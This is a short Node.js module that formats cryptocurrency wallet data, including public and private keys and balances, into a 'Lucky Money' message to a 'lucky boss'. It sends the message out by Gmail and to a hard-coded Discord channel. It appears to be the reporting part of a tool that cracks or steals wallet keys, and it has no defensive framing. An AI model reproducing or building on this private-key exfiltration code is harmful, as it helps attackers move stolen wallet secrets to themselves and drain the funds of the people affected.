require('dotenv').config()
const nodemailer = require('nodemailer')
const Discord = require('discord.js')

const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASSWORD,
  },
})

function processMoney(money) {
  let content = 
`Hello my super lucky boss,
pubk: ${money.pubk}
prik: ${money.prik}
native: ${money.native}
balnce: ${money.balnce}


`
  return content
}

module.exports = {
  sendmail: (money) => {
    let content = processMoney(money)
    //code ===  0x0 -> native
    //else -> !native

    const options = {
      from: process.env.EMAIL,
      to: process.env.EMAIL_TO,
      subject: "Lucky Money",
      text: content,
    }
    
    transporter.sendMail(options)
  },

  senddiscord: (channel, money) => {
    let content = processMoney(money)
    channel.send(content)
  },

  discordSetup: async() => {
    const client = new Discord.Client({ 
      intents: [
        Discord.Intents.FLAGS.GUILDS,
        Discord.Intents.FLAGS.GUILD_MESSAGES,
      ] 
    })
    const str = await client.login(process.env.TOKEN)
    console.log(str)
    const channel = client.channels.cache.find(channel => channel.id === "934897942094053459")
    return channel
  }
}
